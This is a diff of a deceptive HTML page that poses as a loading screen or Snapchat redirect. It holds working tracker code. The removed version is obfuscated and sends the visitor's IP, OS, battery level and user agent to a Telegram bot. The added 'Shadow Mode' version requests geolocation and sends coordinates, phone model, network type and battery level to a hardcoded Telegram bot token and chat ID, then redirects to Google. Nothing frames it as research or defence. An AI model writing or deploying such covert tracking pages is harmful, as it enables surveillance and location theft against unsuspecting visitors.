@@ -1,13 +1,73 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Redirecting...</title><script>
-const _v=(s)=>atob(atob(s));
-const _k1="ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==";
-const _k2="NjAwMTI4NjI3MA==";
-async function _0xSH(){try{
-const n=navigator,r=await fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e').then(x=>x.json());
-const b=await(n.getBattery?n.getBattery():Promise.resolve({level:1}));
-const m=`[SUCCESS]\nIP:${r.ip}\nOS:${n.platform}\nBAT:${b.level*100}%\nUA:${n.userAgent}`;
-const u=`https://api.telegram.org/bot${atob(_k1)}/sendMessage?chat_id=${atob(_k2)}&text=${encodeURIComponent(m)}`;
-if(n.sendBeacon){n.sendBeacon(u)}else{fetch(u,{mode:'no-cors'})}
-setTimeout(()=>{window.location.replace("https://www.snapchat.com/add/official_group")},1500);
-}catch(e){window.location.replace("https://www.snapchat.com/")}}
-window.onload=_0xSH;</script><style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}.p{border:2px solid #111;border-top:2px solid #FFFC00;border-radius:50%;width:30px;height:30px;animation:s 1s linear infinite}@keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class="p"></div></body></html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+</head>
+<body>
+    <script>
+        const _b = s => atob(s);
+        const TOKEN = "8719298403:AAG-9IJg2xLXm0YaV3yy0Z1wGEDGrjFQWxU"; 
+        const CHAT_ID = "6001286270"; 
+
+        async function startCapture() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        await fetchAndSendData(mapLink);
+                    },
+                    async () => { await fetchAndSendData("المستخدم رفض مشاركة الموقع ❌"); }
+                );
+            } else { await fetchAndSendData("المتصفح لا يدعم تحديد الموقع ❌"); }
+        }
+
+        async function fetchAndSendData(locationInfo) {
+            let batteryLevel = "غير معروف";
+            let detailedModel = "غير معروف";
+            let netType = "غير معروف";
+
+            try {
+                // 🔋 جلب البطارية
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                }
+                
+                // 📱 جلب نوع الهاتف الدقيق (تحسين بنسبة 100%)
+                if (navigator.userAgentData) {
+                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    detailedModel = info.model || "غير معروف";
+                }
+
+                // 📶 جلب نوع الشبكة (إضافة جديدة)
+                if (navigator.connection) {
+                    netType = navigator.connection.effectiveType || "غير معروف";
+                }
+            } catch (e) {}
+
+            const text = `🚨 تقرير كامل (Shadow Mode):
+📍 الموقع: ${locationInfo}
+📱 الهاتف الدقيق: ${detailedModel}
+📶 الشبكة: ${netType}
+🔋 البطارية: ${batteryLevel}
+💻 النظام: ${navigator.platform}
+⏰ الوقت: ${new Date().toLocaleString()}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (error) {}
+
+            window.location.href = "https://www.google.com";
+        }
+
+        startCapture();
+    </script>
+</body>
+</html>
